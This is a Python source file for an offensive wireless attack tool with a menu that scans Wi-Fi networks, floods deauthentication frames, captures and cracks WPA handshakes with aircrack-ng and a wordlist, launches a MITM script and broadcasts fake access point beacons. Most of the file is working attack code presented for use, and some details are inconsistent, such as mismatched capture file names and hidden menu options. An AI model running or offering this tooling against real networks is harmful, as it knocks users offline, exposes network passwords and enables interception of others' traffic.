import os
import time
import threading
import audit
from scapy.all import *

# Monitor mode interface
interface = "wlan1"

# Global variables for selected network and client
selected_ap_mac = None
selected_ap_essid = None

# Handshake capture path (saved locally)
handshake_capture_file = "handshake.pcap"
wordlist_path = "wordlist.txt"  # Path to wordlist for cracking

# Dictionary to store discovered networks
networks = {}
sniffing_thread = None
stop_sniffing = threading.Event()

# Function to scan networks
def scan_networks(timeout=10):
    print("[*] Scanning for available networks...")

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            essid = pkt[Dot11Elt].info.decode() if pkt[Dot11Elt].info else "Hidden SSID"
            bssid = pkt[Dot11].addr2
            if bssid not in networks:
                networks[bssid] = essid
                print(f"[*] Found network: {essid} - {bssid}")

    # Run sniffing in a thread to avoid blocking the main code
    global sniffing_thread
    stop_sniffing.clear()
    sniffing_thread = threading.Thread(target=sniff, kwargs={
        'iface': interface,
        'prn': packet_handler,
        'timeout': timeout
    })
    sniffing_thread.start()
    sniffing_thread.join()  # Wait for sniffing to complete
    print("[*] Scanning complete.")

# Function to select a network
def select_network():
    if not networks:
        print("[-] No networks found. Run a scan first (Option 1).")
        return False

    print("\n[*] Available Networks:")
    for idx, (bssid, essid) in enumerate(networks.items(), start=1):
        print(f"{idx}. {essid} ({bssid})")

    try:
        choice = int(input("Select a network (1-{}): ".format(len(networks))))
        selected_bssid = list(networks.keys())[choice - 1]
        selected_essid = networks[selected_bssid]

        global selected_ap_mac, selected_ap_essid
        selected_ap_mac = selected_bssid
        selected_ap_essid = selected_essid
        print(f"[*] Selected {selected_ap_essid} ({selected_ap_mac}).")
        return True
    except (ValueError, IndexError):
        print("[-] Invalid selection.")
        return False

# Function to send deauthentication frames
def send_deauth_frames(ap_mac, client_mac="FF:FF:FF:FF:FF:FF", count=100):
    print(f"[*] Sending deauth frames to {ap_mac} targeting {client_mac}...")
    dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    for _ in range(count):
        sendp(packet, iface=interface, inter=0.1, verbose=False)
    print(f"[*] Sent {count} deauth frames.")

# Function to capture WPA handshake using airodump-ng
def capture_handshake():
    if not selected_ap_mac:
        print("[-] No network selected. Please select one first.")
        return

    print("[*] Listening for WPA handshake...")
    os.system(f"airodump-ng -w handshake --bssid {selected_ap_mac} --channel 6 {interface} &")
    time.sleep(20)  # Capture for 10 seconds
    os.system("pkill airodump-ng")
    print(f"[*] Handshake saved as handshake-01.pcap.")

# Function to check for a valid handshake
def check_handshake():
    print("[*] Checking for handshake...")
    result = os.system(f"aircrack-ng handshake-01.cap")
    if result == 0:
        print("[+] Handshake captured successfully!")
        return True
    else:
        print("[-] No handshake detected.")
        return False

# Function to crack handshake using aircrack-ng
def crack_handshake():
    print("[*] Cracking handshake using aircrack-ng...")
    os.system(f"aircrack-ng handshake-01.cap -w {wordlist_path}")
    print("[*] Cracking attempt finished.")

# Function to perform MITM attack
def mitm_attack():
    ip_range = input("Enter the IP range for MITM attack (e.g., 10.0.0.0/24): ")
    command = f"sudo python3 mitm.py -ip_range {ip_range}"
    print(f"[*] Running MITM attack on {ip_range}...")
    os.system(command)

# Function to create fake APs
def create_fake_ap(essid, channel):
    beacon = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
    beacon /= Dot11Beacon(cap="ESS+privacy")
    beacon /= Dot11Elt(ID="SSID", info=essid)
    beacon /= Dot11Elt(ID="DSset", info=chr(channel).encode())

    sendp(RadioTap()/beacon, iface=interface, inter=0.1, verbose=False)

def create_fake_aps():
    num_aps = int(input("Enter the number of fake APs to create: "))
    for i in range(num_aps):
        essid = input(f"Enter SSID for fake AP {i+1}: ")
        channel = int(input(f"Enter channel (1-13) for fake AP {i+1}: "))
        print(f"[*] Creating fake AP: {essid} on channel {channel}")
        create_fake_ap(essid, channel)
    print("[*] Fake APs created.")

# Offensive menu
def offensive_menu():
    while True:
        print("Offensive Options:")
        print("1. Scan Networks")
        print("2. Deauth and Capture Handshake")
        print("3. Crack Handshake")
        print("4. MITM Attack")
        print("5. Create Fake APs")

        choice = input("Select an option (1-5): ")
        if choice == '1':
            scan_networks()
        elif choice == '2':
            if select_network():
                send_deauth_frames(selected_ap_mac)
                capture_handshake()
                check_handshake()
        elif choice == '3':
            crack_handshake()
        elif choice == '4':
            mitm_attack()
        elif choice == '5':
            create_fake_aps()
        elif choice == '6':
            audit.scan_networks()
            audit.audit_networks()
        elif choice == '7':
            break
            
        
        else:
            print("Invalid choice.")

# Main menu
def main_menu():
    
    
    offensive_menu()

if __name__ == "__main__":
    main_menu()
